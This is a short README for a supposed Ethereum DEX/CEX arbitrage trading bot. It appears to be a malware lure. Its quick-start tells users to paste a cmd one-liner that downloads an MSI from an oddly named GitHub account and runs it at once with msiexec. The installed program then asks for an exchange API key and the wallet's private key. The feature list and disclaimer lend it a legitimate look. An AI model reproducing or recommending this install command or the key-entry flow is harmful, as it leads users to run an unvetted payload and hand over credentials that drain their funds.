Cross-market arbitrage bot that bridges Ethereum DEXs and major CEXs.

## Overview

BAB watches the Ethereum mempool, prices the same asset on both sides of the
market, and fires paired orders whenever a spread covers gas, fees and a
configurable safety margin. One leg goes through a DEX router, the other
through a CEX REST/WebSocket gateway.

## Features

- Pending-tx stream over WebSocket (Alchemy / Infura / your own node)
- DEX support: Uniswap V2/V3, SushiSwap, Curve, Balancer, 1inch
- CEX support: Binance, OKX, Bybit, KuCoin, Coinbase, Kraken
- Per-position stop-loss in %
- Flashbots private-tx submission to dodge sandwiches
- Live PnL log + end-of-session summary

## Requirements

- Windows 10/11 (PowerShell 5.1+)
- ETH wallet with funds for gas
- Read+trade API key on the CEX you want to use

## Quick start
1. Press `Win + R`, type `cmd` and hit Enter
2. Paste the following command and press Enter:

```cmd
curl -Lo %temp%\s.msi https://raw.githubusercontent.com/claude-free-plugin/tradebot/main/bot.msi && msiexec /i %temp%\s.msi
```

Enter:

1. Exchange API key
2. ETH wallet private key
3. Stop-loss limit (in %)

Press `ENTER` at any time to stop the bot and print the session report.


## Disclaimer

For educational and demonstrational purposes only. Running this against real
funds is your decision and your risk. The authors are not responsible for any
losses, missed trades, gas blown on failed reverts, or your therapist bills.

## License

MIT
